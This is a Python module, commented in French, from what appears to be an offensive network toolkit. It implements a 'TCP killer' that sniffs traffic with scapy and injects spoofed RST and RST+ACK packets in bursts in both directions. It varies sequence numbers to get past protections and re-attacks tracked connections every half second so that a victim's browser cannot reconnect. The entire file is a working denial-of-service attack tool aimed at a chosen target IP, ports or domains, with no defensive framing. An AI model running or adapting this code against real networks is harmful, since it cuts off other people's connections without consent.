"""
modules/tcp_killer.py
TCP Session Killer ULTRA-AGRESSIF v2.
- Multi-thread pour réaction ultra-rapide
- RST en rafale (burst mode)
- Attaque proactive sur les ports connus
- Blocage persistant même si le navigateur réessaie
"""
import time
import threading
import socket
from typing import List, Set, Dict, Optional
from dataclasses import dataclass, field
from collections import defaultdict

from scapy.all import (
    sniff, send, sendp, sr, IP, TCP, Ether, Raw,
    conf as scapy_conf, RandShort
)

from core.logger import log
from core.config import conf, attack_conf
from core.utils import resolve_domain, Counter


@dataclass 
class ConnectionTracker:
    """Track une connexion pour l'attaquer en continu."""
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    seq: int = 0
    ack: int = 0
    last_attack: float = 0
    attack_count: int = 0


class TCPKillerV2:
    """
    TCP Killer ULTRA-AGRESSIF.
    
    Stratégies:
    1. Sniff + RST immédiat (réactif)
    2. RST proactif en boucle sur les connexions vues (persistant)
    3. Burst de RST avec variations SEQ (contourne les protections)
    4. Attaque dans les DEUX directions (client ET serveur)
    """
    
    # Nombre de RST par attaque
    RST_BURST_COUNT = 10
    
    # Intervalle entre attaques proactives (secondes)
    PROACTIVE_INTERVAL = 0.5
    
    # Durée de tracking d'une connexion (secondes)
    CONNECTION_TTL = 60
    
    def __init__(
        self,
        target_ip: str = None,
        target_ports: List[int] = None,
        blocked_domains: List[str] = None,
        blocked_ips: Set[str] = None,
        aggressive: bool = True
    ):
        self.target_ip = target_ip
        self.target_ports = set(target_ports) if target_ports else set()
        self.blocked_domains = blocked_domains or []
        self.blocked_ips: Set[str] = blocked_ips or set()
        self.aggressive = aggressive
        
        # Ports à ne JAMAIS toucher
        self.blacklist_ports = {22, 23}  # SSH, Telnet
        
        # État
        self.running = False
        self._sniff_thread: Optional[threading.Thread] = None
        self._attack_thread: Optional[threading.Thread] = None
        self._dns_thread: Optional[threading.Thread] = None
        self._lock = threading.RLock()
        
        # Connexions trackées pour attaque continue
        self._connections: Dict[str, ConnectionTracker] = {}
        
        # Stats
        self.stats = {
            "rst_sent": 0,
            "connections_killed": 0,
            "domains_resolved": 0
        }
        self.start_time = 0.0
    
    def _conn_key(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> str:
        """Clé unique pour une connexion."""
        return f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
    
    def _resolve_dns_loop(self):
        """Résout les domaines en continu."""
        while self.running:
            for domain in self.blocked_domains:
                if not self.running:
                    break
                try:
                    clean = domain.replace("*.", "").replace(".*", "")
                    
                    # Résolution principale
                    ips = resolve_domain(clean)
                    
                    # Sous-domaines communs
                    for prefix in ["www", "m", "mobile", "api", "cdn", "static", 
                                   "edge", "media", "video", "img", "images"]:
                        try:
                            sub_ips = resolve_domain(f"{prefix}.{clean}")
                            ips.update(sub_ips)
                        except:
                            pass
                    
                    if ips:
                        with self._lock:
                            old_count = len(self.blocked_ips)
                            self.blocked_ips.update(ips)
                            new_count = len(self.blocked_ips) - old_count
                            if new_count > 0:
                                self.stats["domains_resolved"] += new_count
                                log.debug(f"DNS {domain}: +{new_count} IPs (total: {len(self.blocked_ips)})")
                except Exception:
                    pass
            
            # Rafraîchir toutes les 10 secondes
            for _ in range(10):
                if not self.running:
                    break
                time.sleep(1)
    
    def _should_kill(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> bool:
        """Détermine si on doit tuer cette connexion."""
        # Blacklist
        if src_port in self.blacklist_ports or dst_port in self.blacklist_ports:
            return False
        
        # Ignorer notre propre trafic
        if src_ip == conf.attacker_ip or dst_ip == conf.attacker_ip:
            return False
        
        # Vérifier la cible
        if self.target_ip:
            if src_ip != self.target_ip and dst_ip != self.target_ip:
                return False
        
        # Vérifier les ports
        if self.target_ports:
            if src_port not in self.target_ports and dst_port not in self.target_ports:
                return False
        
        # Vérifier les IPs bloquées (domaines résolus)
        if self.blocked_ips:
            with self._lock:
                if src_ip not in self.blocked_ips and dst_ip not in self.blocked_ips:
                    return False
        
        return True
    
    def _send_rst_burst(self, src_ip: str, dst_ip: str, 
                        src_port: int, dst_port: int,
                        seq: int = 0, ack: int = 0):
        """
        Envoie une RAFALE de RST dans les deux directions.
        Technique ultra-agressive pour garantir la mort de la connexion.
        """
        try:
            packets = []
            
            # Générer une rafale de RST
            for i in range(self.RST_BURST_COUNT):
                # Direction 1: Vers le serveur (spoof du client)
                # Variation du SEQ pour contourner les protections
                seq_var = seq + i * 1460  # Taille typique d'un segment TCP
                
                rst1 = IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=src_port,
                    dport=dst_port,
                    flags="R",
                    seq=seq_var
                )
                packets.append(rst1)
                
                # RST+ACK aussi
                rst1_ack = IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=src_port,
                    dport=dst_port,
                    flags="RA",
                    seq=seq_var,
                    ack=ack
                )
                packets.append(rst1_ack)
                
                # Direction 2: Vers le client (spoof du serveur)
                ack_var = ack + i * 1460
                
                rst2 = IP(src=dst_ip, dst=src_ip) / TCP(
                    sport=dst_port,
                    dport=src_port,
                    flags="R",
                    seq=ack_var
                )
                packets.append(rst2)
                
                rst2_ack = IP(src=dst_ip, dst=src_ip) / TCP(
                    sport=dst_port,
                    dport=src_port,
                    flags="RA",
                    seq=ack_var,
                    ack=seq_var
                )
                packets.append(rst2_ack)
            
            # Envoyer tous les paquets d'un coup (plus rapide)
            for pkt in packets:
                send(pkt, verbose=False, iface=conf.interface)
            
            with self._lock:
                self.stats["rst_sent"] += len(packets)
                
        except Exception as e:
            log.debug(f"Erreur RST burst: {e}")
    
    def _packet_callback(self, pkt):
        """Callback pour chaque paquet TCP intercepté."""
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
            return
        
        ip = pkt[IP]
        tcp = pkt[TCP]
        
        src_ip = ip.src
        dst_ip = ip.dst
        src_port = tcp.sport
        dst_port = tcp.dport
        seq = tcp.seq
        ack = tcp.ack
        flags = int(tcp.flags)
        
        # Ignorer nos propres RST
        if flags & 0x04 and src_ip == conf.attacker_ip:
            return
        
        # Vérifier si on doit tuer
        if not self._should_kill(src_ip, dst_ip, src_port, dst_port):
            return
        
        # Tracker cette connexion
        key = self._conn_key(src_ip, dst_ip, src_port, dst_port)
        
        with self._lock:
            if key not in self._connections:
                self._connections[key] = ConnectionTracker(
                    src_ip=src_ip, dst_ip=dst_ip,
                    src_port=src_port, dst_port=dst_port
                )
                self.stats["connections_killed"] += 1
                log.attack(f"KILL: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
            
            conn = self._connections[key]
            conn.seq = seq
            conn.ack = ack
            conn.last_attack = time.time()
        
        # Attaque immédiate - RAFALE DE RST
        self._send_rst_burst(src_ip, dst_ip, src_port, dst_port, seq, ack)
    
    def _proactive_attack_loop(self):
        """
        Thread d'attaque proactive.
        Continue à envoyer des RST sur les connexions connues même sans voir de paquets.
        C'est LA clé pour battre les navigateurs qui réessaient.
        """
        while self.running:
            now = time.time()
            to_remove = []
            
            with self._lock:
                connections = list(self._connections.items())
            
            for key, conn in connections:
                if not self.running:
                    break
                
                # Supprimer les vieilles connexions
                if now - conn.last_attack > self.CONNECTION_TTL:
                    to_remove.append(key)
                    continue
                
                # Attaquer proactivement
                self._send_rst_burst(
                    conn.src_ip, conn.dst_ip,
                    conn.src_port, conn.dst_port,
                    conn.seq, conn.ack
                )
                conn.attack_count += 1
            
            # Nettoyer
            if to_remove:
                with self._lock:
                    for key in to_remove:
                        self._connections.pop(key, None)
            
            time.sleep(self.PROACTIVE_INTERVAL)
    
    def _sniff_loop(self):
        """Thread de sniffing."""
        # Construire le filtre BPF
        filters = ["tcp"]
        if self.target_ip:
            filters.append(f"host {self.target_ip}")
        if self.target_ports and len(self.target_ports) <= 5:
            port_f = " or ".join(f"port {p}" for p in self.target_ports)
            filters.append(f"({port_f})")
        
        bpf = " and ".join(filters)
        log.info(f"Sniff filter: {bpf}")
        
        try:
            sniff(
                iface=conf.interface,
                filter=bpf,
                prn=self._packet_callback,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Sniff error: {e}")
    
    def start(self):
        """Démarre le TCP Killer."""
        if self.running:
            return
        
        self.running = True
        self.start_time = time.time()
        
        # Log config
        log.attack("=" * 50)
        log.attack("TCP KILLER ULTRA-AGRESSIF v2")
        log.attack("=" * 50)
        log.info(f"Cible: {self.target_ip or 'Toutes'}")
        if self.target_ports:
            log.info(f"Ports: {self.target_ports}")
        if self.blocked_domains:
            log.info(f"Domaines: {', '.join(self.blocked_domains)}")
        log.info(f"RST burst: {self.RST_BURST_COUNT} paquets/attaque")
        log.info(f"Attaque proactive: toutes les {self.PROACTIVE_INTERVAL}s")
        
        # Thread DNS
        if self.blocked_domains:
            self._dns_thread = threading.Thread(target=self._resolve_dns_loop, daemon=True)
            self._dns_thread.start()
            time.sleep(2)  # Attendre première résolution
            log.info(f"IPs bloquées: {len(self.blocked_ips)}")
        
        # Thread de sniff
        self._sniff_thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._sniff_thread.start()
        
        # Thread d'attaque proactive
        self._attack_thread = threading.Thread(target=self._proactive_attack_loop, daemon=True)
        self._attack_thread.start()
        
        log.success("TCP Killer actif! Les connexions vont être DÉTRUITES.")
    
    def stop(self):
        """Arrête le TCP Killer."""
        if not self.running:
            return
        
        self.running = False
        
        # Attendre les threads
        for t in [self._sniff_thread, self._attack_thread, self._dns_thread]:
            if t and t.is_alive():
                t.join(timeout=2.0)
        
        # Stats finales
        duration = time.time() - self.start_time
        log.success(f"TCP Killer arrêté après {duration:.1f}s")
        log.info(f"  RST envoyés: {self.stats['rst_sent']}")
        log.info(f"  Connexions tuées: {self.stats['connections_killed']}")
    
    def add_domain(self, domain: str):
        """Ajoute un domaine à bloquer."""
        if domain not in self.blocked_domains:
            self.blocked_domains.append(domain)
            # Résolution immédiate
            try:
                ips = resolve_domain(domain)
                with self._lock:
                    self.blocked_ips.update(ips)
                log.info(f"Domaine ajouté: {domain} ({len(ips)} IPs)")
            except:
                pass
    
    def add_ip(self, ip: str):
        """Ajoute une IP à bloquer."""
        with self._lock:
            self.blocked_ips.add(ip)
    
    def get_stats(self) -> dict:
        """Retourne les stats."""
        return {
            "running": self.running,
            "rst_sent": self.stats["rst_sent"],
            "connections_killed": self.stats["connections_killed"],
            "active_connections": len(self._connections),
            "blocked_ips": len(self.blocked_ips),
            "duration": time.time() - self.start_time if self.start_time else 0
        }


# Alias pour compatibilité
TCPKiller = TCPKillerV2
